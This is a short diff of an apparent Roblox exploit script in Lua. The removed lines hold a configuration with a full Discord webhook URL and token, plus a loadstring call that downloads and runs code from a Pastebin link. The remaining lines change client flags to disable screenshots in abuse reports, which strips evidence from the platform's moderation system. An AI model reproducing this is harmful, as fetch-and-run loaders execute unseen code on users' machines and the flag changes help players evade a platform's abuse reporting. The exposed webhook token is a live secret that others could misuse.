@@ -1,20 +1,3 @@
-getgenv().autoreport = {
-    Advertise = true,
-    Safe = false,
-    Webhook = "https://discord.com/api/webhooks/987555599413813278/54jCzWtvVAhLnU0J8_Wycw2qhsEb353tEDAR-4Hb8YOPw_ih21rw9MgbMSqtWhnm9gX8",
-
-    Words = {
-        Blacklisted = "https://raw.githubusercontent.com/CF-Trail/Auto-Report/main/words/blacklisted.lua",
-        Whitelisted = "https://raw.githubusercontent.com/CF-Trail/Auto-Report/main/words/whitelisted.lua"
-    }
-};
-loadstring(game:HttpGet("https://pastebin.com/raw/YL7WxNem"))()
-
-
-
-
-
-
 
 setfflag("AbuseReportScreenshotPercentage", 0)
 setfflag("DFFlagAbuseReportScreenshot", "False")
